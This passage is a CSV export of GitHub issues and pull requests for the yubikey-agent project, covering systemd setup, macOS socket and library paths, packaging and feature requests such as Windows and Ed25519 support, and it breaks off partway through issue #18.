FiloSottile,yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/47,675163515,MDU6SXNzdWU2NzUxNjM1MTU=,47,Remove a paragraph from README/Alternatives/macOS section,11135,closed,FALSE,NA,NA,1,2020-08-07T17:28:18Z,2020-08-07T18:17:36Z,2020-08-07T18:05:04Z,NONE,NA,"In README's ""Alternatives"" section, regarding to the use of ssh-agent, the paragraph about macOS assumes the need for a third-party PKCS#11 library and reasonably talks about its UX issues regarding library load path allow list.

> The ssh-agent that ships with macOS (which is pretty cool, as it starts on demand and is preconfigured in the environment) also has restrictions on where the .so modules can be loaded from. It can see through symlinks, so a Homebrew-installed /usr/local/lib/libykcs11.dylib won't work, while a hard copy at /usr/local/lib/libykcs11.copy.dylib will.

On the other hand, macOS already ships with a PKCS#11 support library at `/usr/lib/ssh-keychain.dylib` that can be used by OpenSSH. As of macOS Catalina it only supports RSA keys but otherwise is functional.

```
% nm -j /usr/lib/ssh-keychain.dylib | egrep '^_C_\w+'
_C_CloseSession
_C_Finalize
_C_FindObjects
_C_FindObjectsFinal
_C_FindObjectsInit
_C_GetAttributeValue
_C_GetFunctionList
_C_GetInfo
_C_GetSlotList
_C_GetTokenInfo
_C_Initialize
_C_Login
_C_OpenSession
_C_Sign
_C_SignInit
```

Do you think this paragraph is still pertinent? I can put a PR mentioning `/usr/lib/ssh-keychain.dylib` and just remove this paragraph to keep things simple.",NA,FALSE,https://api.github.com/repos/FiloSottile/yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/47/labels{/name},https://api.github.com/repos/FiloSottile/yubikey-agent/issues/47/comments,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/47/events,https://github.com/FiloSottile/yubikey-agent/issues/47,NA
FiloSottile,yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/46,664234001,MDExOlB1bGxSZXF1ZXN0NDU1NTA2MTUz,46,FEATURE: allow external password caching,190777,closed,FALSE,NA,NA,3,2020-07-23T06:30:46Z,2020-09-05T15:51:12Z,2020-09-05T15:51:11Z,CONTRIBUTOR,NA,"needs https://github.com/gopasspw/gopass/pull/1469 to be merged first
",NA,TRUE,https://api.github.com/repos/FiloSottile/yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/46/labels{/name},https://api.github.com/repos/FiloSottile/yubikey-agent/issues/46/comments,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/46/events,https://github.com/FiloSottile/yubikey-agent/pull/46,https://api.github.com/repos/FiloSottile/yubikey-agent/pulls/46
FiloSottile,yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/45,658226210,MDU6SXNzdWU2NTgyMjYyMTA=,45,use notification library instead of shelling out to notify-send,183879,open,FALSE,NA,NA,0,2020-07-16T13:58:55Z,2020-07-16T13:58:55Z,NA,CONTRIBUTOR,NA,"`main.go` currently shells out to `osascript` or `notify-send` when sending a notification:

https://github.com/FiloSottile/yubikey-agent/blob/master/main.go#L337-L339

It doesn't implement any notification logic for other platforms.

""https://github.com/gen2brain/beeep provides a cross-platform library for sending desktop notifications, alerts and beeps"".

It doesn't rely on `notify-send` being in `$PATH` (only as a fallback, tries via dbus first), and in addition to Darwin, it also supports sending notifications on Windows.",NA,FALSE,https://api.github.com/repos/FiloSottile/yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/45/labels{/name},https://api.github.com/repos/FiloSottile/yubikey-agent/issues/45/comments,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/45/events,https://github.com/FiloSottile/yubikey-agent/issues/45,NA
FiloSottile,yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/44,656164257,MDU6SXNzdWU2NTYxNjQyNTc=,44,Use sockets passed in from systemd,183879,open,FALSE,NA,NA,1,2020-07-13T21:41:33Z,2020-09-04T02:37:57Z,NA,CONTRIBUTOR,NA,"This would allow yubikey-agent to be started socket-activated by systemd.
Background: https://vincent.bernat.ch/en/blog/2018-systemd-golang-socket-activation",NA,FALSE,https://api.github.com/repos/FiloSottile/yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/44/labels{/name},https://api.github.com/repos/FiloSottile/yubikey-agent/issues/44/comments,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/44/events,https://github.com/FiloSottile/yubikey-agent/issues/44,NA
FiloSottile,yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/43,656110377,MDExOlB1bGxSZXF1ZXN0NDQ4NDY2NDgx,43,systemd: move unit into separate files,183879,closed,FALSE,NA,NA,5,2020-07-13T20:16:34Z,2020-07-20T22:22:33Z,2020-07-15T14:39:56Z,CONTRIBUTOR,NA,"Having them available upstream in a individual text file simplifies packaging.

Also, encourage using the official packages where available (and direct back to `README` for a list).

Also, add a `yubikey-agent.socket` file for file socket based activation.",NA,TRUE,https://api.github.com/repos/FiloSottile/yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/43/labels{/name},https://api.github.com/repos/FiloSottile/yubikey-agent/issues/43/comments,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/43/events,https://github.com/FiloSottile/yubikey-agent/pull/43,https://api.github.com/repos/FiloSottile/yubikey-agent/pulls/43
FiloSottile,yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/42,653609453,MDU6SXNzdWU2NTM2MDk0NTM=,42,Show existing keys on --setup rerun,627891,open,FALSE,NA,NA,0,2020-07-08T21:29:46Z,2020-07-15T14:42:16Z,NA,NONE,NA,"https://github.com/FiloSottile/yubikey-agent/blob/master/setup.go#L69

When `--setup` is rerun, the tool should print out the public key, as a convenience.",NA,FALSE,https://api.github.com/repos/FiloSottile/yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/42/labels{/name},https://api.github.com/repos/FiloSottile/yubikey-agent/issues/42/comments,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/42/events,https://github.com/FiloSottile/yubikey-agent/issues/42,NA
FiloSottile,yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/41,650822419,MDU6SXNzdWU2NTA4MjI0MTk=,41,Systemd user service does not work unmodified on Ubuntu 18.04 (5.3 kernel),1404381,closed,FALSE,NA,NA,8,2020-07-04T04:03:33Z,2020-07-15T14:41:54Z,2020-07-15T14:41:53Z,NONE,NA,"Thanks for building this. With the systemd config as given I hit errors like the following 

```
Jul 03 20:34:44 ubuntu systemd[30813]: yubikey-agent.service: Failed to set up user namespacing: Operation not permitted
Jul 03 20:34:44 ubuntu systemd[30813]: yubikey-agent.service: Failed at step USER spawning /usr/local/bin/yubikey-agent: Operation not permitted
```

and I ended up removing lots of flags in the service section:

```
[Service]
ExecStart=/usr/local/bin/yubikey-agent -l %t/yubikey-agent/yubikey-agent.sock
ExecReload=/bin/kill -HUP $MAINPID
RuntimeDirectory=yubikey-agent
```

I know it is a great idea to use as little privilege as possible. OTOH, since kernels shipped by Ubuntu might not work well with such settings yet, it would be nice if we could provide a little more information to the users.

Reference: https://unix.stackexchange.com/questions/303213/how-to-enable-user-namespaces-in-the-kernel-for-unprivileged-unshare

BTW, `sysctl` settings like

```sh
sudo sysctl -w kernel.unprivileged_userns_clone=1
sudo sysctl -w kernel.unprivileged_userns_apparmor_policy=1
```

does not make it work for me :disappointed: ",NA,FALSE,https://api.github.com/repos/FiloSottile/yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/41/labels{/name},https://api.github.com/repos/FiloSottile/yubikey-agent/issues/41/comments,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/41/events,https://github.com/FiloSottile/yubikey-agent/issues/41,NA
FiloSottile,yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/40,647224556,MDExOlB1bGxSZXF1ZXN0NDQxMjg2NTY2,40,Set the systemd WantedBy directive to default.target,737767,closed,FALSE,NA,NA,0,2020-06-29T08:36:20Z,2020-06-29T16:37:30Z,2020-06-29T15:32:22Z,CONTRIBUTOR,NA,"With the current choice of multi-user.target the agent do not start when
the user boots with a local GUI login.

Closes #39",NA,TRUE,https://api.github.com/repos/FiloSottile/yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/40/labels{/name},https://api.github.com/repos/FiloSottile/yubikey-agent/issues/40/comments,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/40/events,https://github.com/FiloSottile/yubikey-agent/pull/40,https://api.github.com/repos/FiloSottile/yubikey-agent/pulls/40
FiloSottile,yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/39,646968312,MDU6SXNzdWU2NDY5NjgzMTI=,39,yubikey-agent service inactive (dead),261671,closed,FALSE,NA,NA,5,2020-06-28T17:18:40Z,2020-06-29T17:42:04Z,2020-06-29T15:32:21Z,NONE,NA,"Hi I installed this package using the AUR package and ran the following:

```
systemctl daemon-reload --user
sudo systemctl enable --now pcscd.socket
systemctl --user enable --now yubikey-agent
```
But then I realize, when the computer is rebooted, the yubikey-agent do not restart, this cause the SSH_AUTH_SOCK to not be found.

Here is the output for `systemctl --user status yubikey-agent`
```
● yubikey-agent.service - Seamless ssh-agent for YubiKeys
     Loaded: loaded (/usr/lib/systemd/user/yubikey-agent.service; enabled; vend>
     Active: inactive (dead)
       Docs: https://filippo.io/yubikey-agent
```

System information:

```
OS: Manjaro 20.0.3 Lysia
Kernel: x86_64 Linux 5.6.16-1-MANJARO
DE: GNOME 3.36.3
```

Anyhelp would be nice, thank you",NA,FALSE,https://api.github.com/repos/FiloSottile/yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/39/labels{/name},https://api.github.com/repos/FiloSottile/yubikey-agent/issues/39/comments,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/39/events,https://github.com/FiloSottile/yubikey-agent/issues/39,NA
FiloSottile,yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/38,645107853,MDU6SXNzdWU2NDUxMDc4NTM=,38,Homebrew release for 0.1.2,117,closed,FALSE,NA,NA,1,2020-06-25T02:57:36Z,2020-06-28T04:33:32Z,2020-06-27T18:02:55Z,NONE,NA,"v0.1.2 seems to have been tagged, but the homebrew formula was not updated to reflect that.

https://github.com/FiloSottile/yubikey-agent/commits/v0.1.2",NA,FALSE,https://api.github.com/repos/FiloSottile/yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/38/labels{/name},https://api.github.com/repos/FiloSottile/yubikey-agent/issues/38/comments,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/38/events,https://github.com/FiloSottile/yubikey-agent/issues/38,NA
FiloSottile,yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/37,642573229,MDExOlB1bGxSZXF1ZXN0NDM3NTUyNDI4,37,Propose a systemd/Linux setup that survive a reboot,737767,closed,FALSE,NA,NA,1,2020-06-21T14:25:12Z,2020-06-21T18:15:48Z,2020-06-21T18:15:45Z,CONTRIBUTOR,NA,With the current instructions yubikey-agent will not be restarted after a reboot. In most situations this is not what a user expect.,NA,TRUE,https://api.github.com/repos/FiloSottile/yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/37/labels{/name},https://api.github.com/repos/FiloSottile/yubikey-agent/issues/37/comments,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/37/events,https://github.com/FiloSottile/yubikey-agent/pull/37,https://api.github.com/repos/FiloSottile/yubikey-agent/pulls/37
FiloSottile,yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/36,641946973,MDU6SXNzdWU2NDE5NDY5NzM=,36,Add support for longer PINs,743648,closed,FALSE,NA,NA,1,2020-06-19T12:51:56Z,2020-06-20T21:57:08Z,2020-06-20T21:57:08Z,NONE,NA,"Currently the tool supports PINs of up to 8 characters, due to limitations from the YubiKeys. However, this limits the possibility of using passphrases, which are easier to remember. The YubiKey does a good job to prevent bruteforcing, but I think it's still worth adding this functionality.

The idea is to have a PIN, and then use its Base-n hash format, or at least the first 8 encoded characters of it.

This can allow for an unlimited (or at least larger) PIN to be set, and with the proper CLI tool, or maybe even website, someone can determine the YubiKey PIN based on the entered PIN, using the same algorithm.",NA,FALSE,https://api.github.com/repos/FiloSottile/yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/36/labels{/name},https://api.github.com/repos/FiloSottile/yubikey-agent/issues/36/comments,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/36/events,https://github.com/FiloSottile/yubikey-agent/issues/36,NA
FiloSottile,yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/35,638056001,MDExOlB1bGxSZXF1ZXN0NDMzOTI3Nzk5,35,Add install instructions for Linux.,220205,closed,FALSE,NA,NA,2,2020-06-13T00:03:36Z,2020-06-20T20:00:50Z,2020-06-20T20:00:50Z,NONE,NA,"This provides a systemd unit that starts yubikey-agent at graphical
login and runs it as the logged-in user, paralleling how Ubuntu treats
ssh-agent. Not yet tested on other systemd-using distros.",NA,TRUE,https://api.github.com/repos/FiloSottile/yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/35/labels{/name},https://api.github.com/repos/FiloSottile/yubikey-agent/issues/35/comments,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/35/events,https://github.com/FiloSottile/yubikey-agent/pull/35,https://api.github.com/repos/FiloSottile/yubikey-agent/pulls/35
FiloSottile,yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/34,634868379,MDU6SXNzdWU2MzQ4NjgzNzk=,34,Yubikey 5ci Issue (fixed in piv-go upstream),117,closed,FALSE,NA,NA,0,2020-06-08T19:12:38Z,2020-06-20T22:18:31Z,2020-06-20T22:18:31Z,NONE,NA,"I am having an issue with a Yubikey 5ci on macOS 10.15.5. The output in the `yubikey-agent.log` says:

```
❯ cat /usr/local/var/log/yubikey-agent.log
Connecting to the YubiKey...
agent 13: failed to prepare private key: parse attestation cert: parsing extension: unrecognized formfactor: 0x5
```

This seems to have been resolved in a commit upstream in `piv-go` (see link below). I don't think its included in latest release that has been cut for that repo though. Can a new version be cut and pulled in and a new release of yubikey-agent cut?

https://github.com/go-piv/piv-go/issues/62

The issue in https://github.com/FiloSottile/yubikey-agent/issues/32 has the same output and it might be a related issue, but the submitter of that issue didn't include the log output so I can't be sure its the same.",NA,FALSE,https://api.github.com/repos/FiloSottile/yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/34/labels{/name},https://api.github.com/repos/FiloSottile/yubikey-agent/issues/34/comments,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/34/events,https://github.com/FiloSottile/yubikey-agent/issues/34,NA
FiloSottile,yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/33,629056985,MDExOlB1bGxSZXF1ZXN0NDI2NDY5NzY0,33,Prompt the user for touch on Linux systems,2419961,closed,FALSE,NA,NA,3,2020-06-02T09:39:23Z,2020-06-21T00:57:21Z,2020-06-21T00:57:21Z,NONE,NA,Related to #8 (Prompt for touch). Note that it only works on Linux sytems using libnotify.,NA,TRUE,https://api.github.com/repos/FiloSottile/yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/33/labels{/name},https://api.github.com/repos/FiloSottile/yubikey-agent/issues/33/comments,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/33/events,https://github.com/FiloSottile/yubikey-agent/pull/33,https://api.github.com/repos/FiloSottile/yubikey-agent/pulls/33
FiloSottile,yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/32,628037595,MDU6SXNzdWU2MjgwMzc1OTU=,32,YK Neo signing fails,1818340,closed,FALSE,NA,NA,2,2020-05-31T20:27:03Z,2020-06-20T22:18:32Z,2020-06-20T22:18:32Z,NONE,NA,"First of all, thanks so much for creating this!

I own three identically configured YKs (4c, 5, neo), where the neo is the backup. All three keys have PIV enabled for macOS login, I just reuse slot 9a here.

Testing with Github, I've noticed that SSH auth with the Neo does not seem to work.

YK 4C (works as expected):
```
> ssh -T git@github.com
Hi felixhammerl! You've successfully authenticated, but GitHub does not provide shell access.
```

YK 5 (works as expected):
```
> ssh -T git@github.com
Hi felixhammerl! You've successfully authenticated, but GitHub does not provide shell access.
```

YK Neo:
```
> ssh -T git@github.com
sign_and_send_pubkey: signing failed: agent refused operation
git@github.com: Permission denied (publickey).
> killall -HUP yubikey-agent
> ssh -T git@github.com
sign_and_send_pubkey: signing failed: agent refused operation
git@github.com: Permission denied (publickey).
```

PGP is not in use on the YKs. Not sure what the issue might be.

```
> cat ~/.ssh/config
Host *
    IdentityAgent /usr/local/var/run/yubikey-agent.sock
```",NA,FALSE,https://api.github.com/repos/FiloSottile/yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/32/labels{/name},https://api.github.com/repos/FiloSottile/yubikey-agent/issues/32/comments,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/32/events,https://github.com/FiloSottile/yubikey-agent/issues/32,NA
FiloSottile,yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/31,627005103,MDU6SXNzdWU2MjcwMDUxMDM=,31,Cant find yubikey-agent.sock,22932825,closed,FALSE,NA,NA,10,2020-05-29T05:17:33Z,2020-06-07T01:20:10Z,2020-06-07T01:20:10Z,NONE,NA,"I had everything working fine and then i woke up after an update of some SW on Manjaro and i can no longer find the yubikey-agent.sock

How do i know where to find this file on arch/manjaro?  

i had this in my zshell .zshrc, it used to work yesterday 

export SSH_AUTH_SOCK=""/var/run/user/1000/yubikey-agent/yubikey-agent.sock""  

and then today i can no longer find this flie after some system updates.

How do i get this file and where do i place it?

i uninstalled and reinstalled yubikey-agent and i still cant find this file.",NA,FALSE,https://api.github.com/repos/FiloSottile/yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/31/labels{/name},https://api.github.com/repos/FiloSottile/yubikey-agent/issues/31/comments,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/31/events,https://github.com/FiloSottile/yubikey-agent/issues/31,NA
FiloSottile,yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/30,625605224,MDU6SXNzdWU2MjU2MDUyMjQ=,30,Service won't start after macOS update,2398124,closed,FALSE,NA,NA,2,2020-05-27T11:16:07Z,2020-06-20T22:52:17Z,2020-06-20T22:52:17Z,NONE,NA,"I have version 0.1.1 installed with Homebrew. I noticed that yubikey-agent stopped working. From `/usr/local/var/log/yubikey-agent.log`:

```
Failed to listen on UNIX socket: listen unix /usr/local/var/run/yubikey-agent.sock: bind: no such file or directory
```

(Side note: lack of timestamps in the log is mildly annoying.)

Seemingly the `run` directory disappeared from `/usr/local/var/`, and the only thing I can think of is today's macOS update to 10.15.5, which might have nuked it (or perhaps the reboot?). Recreating the directory brought the service back to life.

Should yubikey-agent ensure this directory exists (instead of the Homebrew script)?",NA,FALSE,https://api.github.com/repos/FiloSottile/yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/30/labels{/name},https://api.github.com/repos/FiloSottile/yubikey-agent/issues/30/comments,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/30/events,https://github.com/FiloSottile/yubikey-agent/issues/30,NA
FiloSottile,yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/29,625481124,MDExOlB1bGxSZXF1ZXN0NDIzNjg1NjUz,29,First pass at Windows support,1049222,open,FALSE,NA,NA,4,2020-05-27T08:16:22Z,2021-02-11T12:14:29Z,NA,NONE,NA,"Hey, this is a quick-and-dirty windows PoC. I'm not sure how you want to go about structuring the program in the long run, so for now everything still lives in `main`.

I have plans to add a single-binary (but dual process) WSL proxy component -- some guidance on how you want to proceed there layout/abstraction-wise would be welcome (my thoughts are a `cmd/yubikey-agent` and a `cmd/yubikey-agent-wsl` that only builds on Windows).

Big thanks to @tobiaskohlbau for getting a hard-to-track-down buffer bug fixed in upstream gopass.",NA,TRUE,https://api.github.com/repos/FiloSottile/yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/29/labels{/name},https://api.github.com/repos/FiloSottile/yubikey-agent/issues/29/comments,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/29/events,https://github.com/FiloSottile/yubikey-agent/pull/29,https://api.github.com/repos/FiloSottile/yubikey-agent/pulls/29
FiloSottile,yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/28,623670301,MDU6SXNzdWU2MjM2NzAzMDE=,28,ssh config example has order reversed,617845,closed,FALSE,NA,NA,1,2020-05-23T14:20:51Z,2020-05-23T16:49:03Z,2020-05-23T16:49:03Z,NONE,NA,"In the README you have the following snippet to show how to use yubikey-agent for all hosts but one:

```
Host *
    IdentityAgent /usr/local/var/run/yubikey-agent.sock

Host example.com
    IdentityAgent $SSH_AUTH_SOCK
```

SSH will apply the first match so the order here needs to be reversed.  As written example.com will attempt to use yubikey-agent.
",NA,FALSE,https://api.github.com/repos/FiloSottile/yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/28/labels{/name},https://api.github.com/repos/FiloSottile/yubikey-agent/issues/28/comments,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/28/events,https://github.com/FiloSottile/yubikey-agent/issues/28,NA
FiloSottile,yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/27,621488522,MDExOlB1bGxSZXF1ZXN0NDIwNTI5OTU1,27,Support multiple Yubikeys and load all slots,305104,closed,FALSE,NA,NA,7,2020-05-20T06:11:58Z,2021-01-10T06:12:09Z,2020-09-15T21:40:01Z,NONE,NA,Fixes #22 ,NA,TRUE,https://api.github.com/repos/FiloSottile/yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/27/labels{/name},https://api.github.com/repos/FiloSottile/yubikey-agent/issues/27/comments,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/27/events,https://github.com/FiloSottile/yubikey-agent/pull/27,https://api.github.com/repos/FiloSottile/yubikey-agent/pulls/27
FiloSottile,yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/26,620474766,MDExOlB1bGxSZXF1ZXN0NDE5NzE2NzQy,26,WIP: Support Ed25519 keys in setup,1092423,open,FALSE,NA,NA,7,2020-05-18T20:10:51Z,2021-02-11T12:14:29Z,NA,NONE,NA,Thoughts on this? Would adjust dependency if/when https://github.com/go-piv/piv-go/pull/69 is accepted.,NA,TRUE,https://api.github.com/repos/FiloSottile/yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/26/labels{/name},https://api.github.com/repos/FiloSottile/yubikey-agent/issues/26/comments,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/26/events,https://github.com/FiloSottile/yubikey-agent/pull/26,https://api.github.com/repos/FiloSottile/yubikey-agent/pulls/26
FiloSottile,yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/25,617666773,MDU6SXNzdWU2MTc2NjY3NzM=,25,"Get Homebrew not to show ""sudo"" in the brew services command",1225294,closed,FALSE,NA,NA,2,2020-05-13T18:35:46Z,2020-05-23T19:29:17Z,2020-05-23T19:29:17Z,OWNER,NA,"yubikey-agent should not be run as root, but Homebrew autocatically shows `sudo brew services start`, causing issues like #16.",NA,FALSE,https://api.github.com/repos/FiloSottile/yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/25/labels{/name},https://api.github.com/repos/FiloSottile/yubikey-agent/issues/25/comments,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/25/events,https://github.com/FiloSottile/yubikey-agent/issues/25,NA
FiloSottile,yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/24,617163266,MDU6SXNzdWU2MTcxNjMyNjY=,24,roadmap question: git commit signing / compatibility with smimesign,9592259,closed,FALSE,NA,NA,3,2020-05-13T05:52:55Z,2021-01-03T14:58:48Z,2020-06-20T23:42:42Z,CONTRIBUTOR,NA,Would it make sense to have this project compatible with [smimesign](https://github.com/github/smimesign) from GitHub? Or to implement similar functionality for git commit signing.,NA,FALSE,https://api.github.com/repos/FiloSottile/yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/24/labels{/name},https://api.github.com/repos/FiloSottile/yubikey-agent/issues/24/comments,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/24/events,https://github.com/FiloSottile/yubikey-agent/issues/24,NA
FiloSottile,yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/23,617139025,MDExOlB1bGxSZXF1ZXN0NDE3MTEzOTM5,23,README: drop note about ykman and PIN bruteforcing,9592259,closed,FALSE,NA,NA,0,2020-05-13T04:50:39Z,2020-05-13T06:12:42Z,2020-05-13T06:12:42Z,CONTRIBUTOR,NA,Fixes #21,NA,TRUE,https://api.github.com/repos/FiloSottile/yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/23/labels{/name},https://api.github.com/repos/FiloSottile/yubikey-agent/issues/23/comments,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/23/events,https://github.com/FiloSottile/yubikey-agent/pull/23,https://api.github.com/repos/FiloSottile/yubikey-agent/pulls/23
FiloSottile,yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/22,616439703,MDU6SXNzdWU2MTY0Mzk3MDM=,22,Generate two keys with different touch policies,305104,open,FALSE,NA,NA,14,2020-05-12T07:49:58Z,2020-09-15T22:29:54Z,NA,NONE,NA,"It should be possible to support two different keys with different touch policy on Yubikey. This would allow having some more sensitive services require a touch, but also enable other services to still use the hardware key but no touch required, only PIN per session.

Primary use case for me now is Github; I have auto-fetch on my editor and it keeps prompting for touch. It is making way too many (unidentified, #8 ) prompts for touch. If I could use a second slot on the same key for no-touch use cases, it would not be a problem, as long as SSH doesn't trigger signing and therefore touch for the passive other key with touch-required.",NA,FALSE,https://api.github.com/repos/FiloSottile/yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/22/labels{/name},https://api.github.com/repos/FiloSottile/yubikey-agent/issues/22/comments,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/22/events,https://github.com/FiloSottile/yubikey-agent/issues/22,NA
FiloSottile,yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/21,616418533,MDU6SXNzdWU2MTY0MTg1MzM=,21,docs: re YubiKey Manager and PIN bruteforcing,9592259,closed,FALSE,NA,NA,5,2020-05-12T07:12:36Z,2020-05-13T06:12:42Z,2020-05-13T06:12:42Z,CONTRIBUTOR,NA,"README states:

> yubikey-agent -setup generates a random Management Key and stores it in PIN-protected metadata. Note that this is a different scheme from the ykman one, which enables PIN bruteforcing.

I think this is referring to an [older scheme](https://developers.yubico.com/yubikey-piv-manager/PIN_and_Management_Key.html) used by the YubiKey PIV Manager. 

`ykman` can actually store the management key in a pin protected part of the device, using the `--protect` flag. I have not verified it yet, but it looks like `yubikey-agent` and `ykman` should be compatible in this regard.",NA,FALSE,https://api.github.com/repos/FiloSottile/yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/21/labels{/name},https://api.github.com/repos/FiloSottile/yubikey-agent/issues/21/comments,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/21/events,https://github.com/FiloSottile/yubikey-agent/issues/21,NA
FiloSottile,yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/20,615968540,MDExOlB1bGxSZXF1ZXN0NDE2MTczNDQy,20,Add manual setup instructions with systemd,737767,closed,FALSE,NA,NA,2,2020-05-11T15:20:14Z,2020-06-21T14:27:08Z,2020-06-21T08:31:40Z,CONTRIBUTOR,NA,The main difference with #9 is that the agent is not executed by a system user but by the user wanting to use the socket. It makes things easier to access the socket and to communicate with pinentry. It also avoids the situation mentioned in #17.,NA,TRUE,https://api.github.com/repos/FiloSottile/yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/20/labels{/name},https://api.github.com/repos/FiloSottile/yubikey-agent/issues/20/comments,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/20/events,https://github.com/FiloSottile/yubikey-agent/pull/20,https://api.github.com/repos/FiloSottile/yubikey-agent/pulls/20
FiloSottile,yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/19,615746414,MDU6SXNzdWU2MTU3NDY0MTQ=,19,Fallback to forwarding to another ssh-agent for unsupported or unknown keys,1520965,open,FALSE,NA,NA,6,2020-05-11T09:47:57Z,2020-12-22T14:53:19Z,NA,NONE,NA,"Is it possible to add other types of SSH keys to the agent as well? Currently, I can't add RSA or ed25519 keys.

```
/Users/andreicek/maandagapp% ssh-add ~/.ssh/id_rsa
Enter passphrase for /Users/andreicek/.ssh/id_rsa:
Could not add identity ""/Users/andreicek/.ssh/id_rsa"": agent refused operation
/Users/andreicek/maandagapp% ssh-add ~/.ssh/id_ed25519
Enter passphrase for /Users/andreicek/.ssh/id_ed25519:
Could not add identity ""/Users/andreicek/.ssh/id_ed25519"": agent refused operation
```",NA,FALSE,https://api.github.com/repos/FiloSottile/yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/19/labels{/name},https://api.github.com/repos/FiloSottile/yubikey-agent/issues/19/comments,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/19/events,https://github.com/FiloSottile/yubikey-agent/issues/19,NA
FiloSottile,yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/18,615623931,MDU6SXNzdWU2MTU2MjM5MzE=,18,Setup should print existing public key,104548,closed,FALSE,NA,NA,1,2020-05-11T06:27:36Z,2020-05-12T03:45:25Z,2020-05-12T03:45:25Z,NONE,NA,"I am using PIV authentication for logging in to my computer and don't want to delete existing keys.

